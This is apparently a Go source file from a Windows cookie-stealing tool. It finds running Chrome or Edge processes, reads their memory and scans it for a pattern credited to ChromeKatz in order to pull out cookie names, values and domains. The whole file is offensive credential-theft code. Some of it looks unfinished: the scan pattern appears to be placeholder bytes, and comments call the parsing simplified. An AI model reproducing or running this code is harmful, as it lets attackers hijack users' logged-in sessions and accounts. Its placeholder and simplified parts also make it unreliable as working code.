//go:build windows
// +build windows

package cookies

import (
	"fmt"
	"runtime"
	"unsafe"

	"golang.org/x/sys/windows"
)

// CanonicalCookie structures for different Chrome versions
type CanonicalCookieChrome struct {
	Name         [200]byte
	Value        [4096]byte
	Domain       [256]byte
	Path         [256]byte
	CreationDate int64
	ExpiryDate   int64
	LastAccess   int64
	LastUpdate   int64
	Secure       bool
	HttpOnly     bool
	FirstParty   bool
	SameParty    bool
	SourcePort   int32
}

type CanonicalCookieEdge struct {
	Name         [200]byte
	Value        [4096]byte
	Domain       [256]byte
	Path         [256]byte
	CreationDate int64
	ExpiryDate   int64
	LastAccess   int64
	LastUpdate   int64
	Secure       bool
	HttpOnly     bool
}

// ProcessMemoryExtractor handles memory-based cookie extraction
type ProcessMemoryExtractor struct {
	processHandle windows.Handle
	processID     uint32
	baseAddress   uintptr
}

// FindChromeProcess finds the first available Chrome process
func FindChromeProcess() (uint32, error) {
	if runtime.GOOS != "windows" {
		return 0, fmt.Errorf("memory extraction only supported on Windows")
	}

	// Find Chrome process using Windows API
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snapshot)

	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))

	if err := windows.Process32First(snapshot, &pe); err != nil {
		return 0, err
	}

	for {
		exeName := windows.UTF16ToString(pe.ExeFile[:])
		if exeName == "chrome.exe" || exeName == "msedge.exe" {
			return pe.ProcessID, nil
		}

		if err := windows.Process32Next(snapshot, &pe); err != nil {
			break
		}
	}

	return 0, fmt.Errorf("no Chrome/Edge process found")
}

// NewMemoryExtractor creates a new memory extractor for a process
func NewMemoryExtractor(processID uint32) (*ProcessMemoryExtractor, error) {
	hProcess, err := windows.OpenProcess(windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, processID)
	if err != nil {
		return nil, err
	}

	return &ProcessMemoryExtractor{
		processHandle: hProcess,
		processID:     processID,
		baseAddress:   0,
	}, nil
}

// Close closes the process handle
func (pe *ProcessMemoryExtractor) Close() error {
	return windows.CloseHandle(pe.processHandle)
}

// GetModuleBaseAddress gets the base address of a module in the process
func (pe *ProcessMemoryExtractor) GetModuleBaseAddress(moduleName string) (uintptr, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPMODULE, pe.processID)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snapshot)

	var me windows.ModuleEntry32
	me.Size = uint32(unsafe.Sizeof(me))

	if err := windows.Module32First(snapshot, &me); err != nil {
		return 0, err
	}

	targetName := moduleName + ".dll"
	for {
		modName := windows.UTF16ToString(me.ModuleName[:])
		if modName == targetName {
			return uintptr(me.BaseOfDll), nil
		}

		if err := windows.Module32Next(snapshot, &me); err != nil {
			break
		}
	}

	return 0, fmt.Errorf("module %s not found", moduleName)
}

// SearchPatternInMemory searches for a pattern in process memory
func (pe *ProcessMemoryExtractor) SearchPatternInMemory(pattern []byte) []uintptr {
	var matches []uintptr
	var mvi windows.MemoryBasicInformation

	currentAddr := uintptr(0x400000) // Start from typical user-mode space

	for currentAddr < uintptr(0x7FFFFFFF0000) {
		err := windows.VirtualQueryEx(pe.processHandle, currentAddr, &mvi, unsafe.Sizeof(mvi))
		if err != nil {
			currentAddr += 0x1000
			continue
		}

		// Only read committed memory
		if mvi.State != windows.MEM_COMMIT {
			currentAddr += mvi.RegionSize
			continue
		}

		// Try to read this memory region
		buffer := make([]byte, mvi.RegionSize)
		var nRead uintptr
		err = windows.ReadProcessMemory(pe.processHandle, currentAddr, &buffer[0], uintptr(len(buffer)), &nRead)
		if err != nil || nRead == 0 {
			currentAddr += mvi.RegionSize
			continue
		}

		// Search for pattern in this buffer
		for i := 0; i < len(buffer)-len(pattern); i++ {
			if matchPattern(buffer[i:i+len(pattern)], pattern) {
				matches = append(matches, currentAddr+uintptr(i))
			}
		}

		currentAddr += mvi.RegionSize
	}

	return matches
}

// matchPattern matches a byte pattern (with wildcards)
func matchPattern(data, pattern []byte) bool {
	if len(data) < len(pattern) {
		return false
	}
	for i := range pattern {
		if pattern[i] != 0x00 && data[i] != pattern[i] {
			return false
		}
	}
	return true
}

// ReadCookieFromMemory reads a cookie structure from process memory
func (pe *ProcessMemoryExtractor) ReadCookieFromMemory(addr uintptr) (*BrowserCookie, error) {
	buffer := make([]byte, 8192)
	var nRead uintptr

	err := windows.ReadProcessMemory(pe.processHandle, addr, &buffer[0], uintptr(len(buffer)), &nRead)
	if err != nil || nRead == 0 {
		return nil, fmt.Errorf("failed to read memory at %x", addr)
	}

	// Parse cookie structure (simplified - adjust based on actual struct layout)
	cookie := &BrowserCookie{}

	// Extract strings from buffer
	// This is a simplified version - real implementation would parse the struct properly
	if nRead > 100 {
		// Name is typically at offset 0
		nameEnd := findNullTerminator(buffer, 0, 200)
		cookie.Name = string(buffer[0:nameEnd])

		// Value typically follows
		valueStart := nameEnd + 1
		valueEnd := findNullTerminator(buffer, valueStart, 4096)
		if valueEnd > valueStart {
			cookie.Value = string(buffer[valueStart:valueEnd])
		}

		// Domain
		domainStart := valueEnd + 1
		domainEnd := findNullTerminator(buffer, domainStart, 256)
		if domainEnd > domainStart {
			cookie.Host = string(buffer[domainStart:domainEnd])
		}
	}

	return cookie, nil
}

func findNullTerminator(data []byte, start, maxLen int) int {
	end := start + maxLen
	if end > len(data) {
		end = len(data)
	}
	for i := start; i < end; i++ {
		if data[i] == 0 {
			return i
		}
	}
	return end
}

// ExtractCookiesFromMemory extracts cookies from a running Chrome process
func ExtractCookiesFromMemory() ([]BrowserCookie, error) {
	if runtime.GOOS != "windows" {
		return nil, fmt.Errorf("memory extraction only available on Windows")
	}

	// Find Chrome process
	pid, err := FindChromeProcess()
	if err != nil {
		return nil, err
	}

	// Open process
	extractor, err := NewMemoryExtractor(pid)
	if err != nil {
		return nil, err
	}
	defer extractor.Close()

	// The "one pattern to rule them all" from ChromeKatz
	// This pattern represents a cookie container structure
	pattern := []byte{
		0xAA, 0xAA, 0xAA, 0xAA, 0xCC, 0xCC, 0xCC, 0xCC, 0xAA, 0xAA, 0xAA, 0xAA, 0xBB, 0xBB, 0xBB, 0xBB,
		0xAA, 0xAA, 0xAA, 0xAA, 0xBB, 0xBB, 0xBB, 0xBB, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00,
	}

	// Search for pattern
	matches := extractor.SearchPatternInMemory(pattern)
	if len(matches) == 0 {
		return nil, fmt.Errorf("no cookie patterns found in memory")
	}

	// Extract cookies from matched locations
	var cookies []BrowserCookie
	for _, addr := range matches {
		if cookie, err := extractor.ReadCookieFromMemory(addr); err == nil {
			cookies = append(cookies, *cookie)
		}
	}

	return cookies, nil
}

// ListChromeProcesses lists all available Chrome/Edge processes
func ListChromeProcesses() ([]map[string]interface{}, error) {
	var processes []map[string]interface{}

	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(snapshot)

	var pe windows.ProcessEntry32
	pe.Size = uint32(unsafe.Sizeof(pe))

	if err := windows.Process32First(snapshot, &pe); err != nil {
		return nil, err
	}

	for {
		exeName := windows.UTF16ToString(pe.ExeFile[:])
		if exeName == "chrome.exe" || exeName == "msedge.exe" {
			processes = append(processes, map[string]interface{}{
				"name": exeName,
				"pid":  pe.ProcessID,
			})
		}

		if err := windows.Process32Next(snapshot, &pe); err != nil {
			break
		}
	}

	return processes, nil
}
